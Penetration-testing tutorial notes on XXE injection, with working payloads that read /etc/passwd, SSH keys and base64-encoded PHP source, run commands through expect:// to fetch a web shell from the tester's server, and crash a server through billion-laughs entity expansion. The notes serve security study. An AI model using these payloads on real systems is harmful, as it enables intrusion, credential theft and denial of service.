# Local File Disclosure
***
#### In certain cases, such as when a web application trusts unfiltered XML data from user input, we may be able to reference an external XML DTD document and define new custom XML entities. With that we could exfiltrate sensitive data from local files by defining external entities.

### Identifying
#### In order to identify potential XXE vulnerabilities we should find pages that accept an XML user input. For instance, we can intercept an HTTP request using Burp and check if it is sending data in an XML format to the web server.
#### Supposing that the web application uses outdated XML libraries, and it does not include any filter or sanitization on our XML input , we may be able to exploit it to read local files.

#### If we find any value of an element, from the data sent in an XML format, reflected on the response from the web server , we should try and inject to those elements.
#### Example:
#### First we define a new entity and then use it as a variable in the reflected element to see whether it gets replaced with the value we set.
```xml
<!DOCTYPE email [
  <!ENTITY company "Rogue Company">
]>
```
#### **NOTE:** When the `DOCTYPE` is already declared in the XML request, we should just add the `ENTITY`element to it.
#### Then we just need to reference with `&company`:
```xml
<?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE email [
  <!ENTITY company "Rogue Company">
]>
<root>
  <name>Leet</name>
  <tel></tel>
  <email>&company;</email>
  <messages>
   1337
  </messages>
</root>
```
#### **NOTE:** While some web applications may default to a JSON format in HTTP request, they may accept other formats, including XML. In order to test that we can change the `Content-Type` header to `application/xml`and [convert](https://www.convertjson.com/json-to-xml.htm) the JSON data to XML.

### Reading Sensitive Files
#### After checking if we can define new internal XML entities we may try to define external XML entities by just adding the `SYSTEM` keyword and defining the external reference path after it :
```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```
#### This enables us to read the content of sensitive files, such as configuration files that amy contain passwords or other sensitive files like an `id_rsa`SSH key of a specific user.
#### **NOTE**: certain Java web applications may also let us specify a directory instead of a file, allowing us to get a directory listing instead for locating sensitive files.

### Reading Source Code
#### With local file disclosure we may also obtain the source code of the web application, allowing us to perform a `Whitebox Penetration Test` or discovering secret configurations like database passwords or API keys.
#### One important thing to consider is that when we are referencing a file that  is not in a proper XML format , it will fail to be referenced as an external XML entity. This happens because when a file has some of XML's special characters (e.g `</>/&`), it will break the external entity reference.
#### An interesting workaround for that is using PHP wrapper filters, so we can encode to base64 certain resources and consequently it won't break the XML format. For instance , we could use `php://filter/` wrapper instead of `file://` as our reference. With this filter, we can specify the `convert.base64-encode`encoder a sour filter, an then add an input resource:
```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```
#### **NOTE:** This feature will only work with PHP web applications.

### Remote Code Execution with XXE
#### To perform a RCE we could look for ssh keys, or attempt to utilize a hash stealing trick in Windows-based web applications, by making call to our server. Another way is to use the `PHP://expect` filter on PHP-based web application (this method requires the PHP expect module to be installed and enabled)
#### If it directly prints its output , then we can execute basic commands such as  `expect://id`.
#### We may also fetch a web shell from our server and write it to the web app, to later interact with it to execute commands.
```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```

#### As we can observe all spaces have been replaced with $IFS, to avoid breaking the XML syntax. Other characters such as `|`, `>` and `{` may also break the code , so we should avoid them.

### Other XXE Attacks
#### It is also possible to test for SSRF through XXE vulnerabilities, enumerating locally open ports and access their pages and access other restricted web pages.
#### Lastly, we can use the XXE attacks to perform a Denial of Service (DoS) to the hosting web server by using the following payload:
```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY a0 "DoS" >
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">        
  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">        
]>
<root>
<name></name>
<tel></tel>
<email>&a10;</email>
<message></message>
</root>
```

#### The payload above defines the `a0` entity as DoS, references it in a1 multiple times, references a1 in a2, and so on until the back-end server's memory runs out doe to self-reference loops.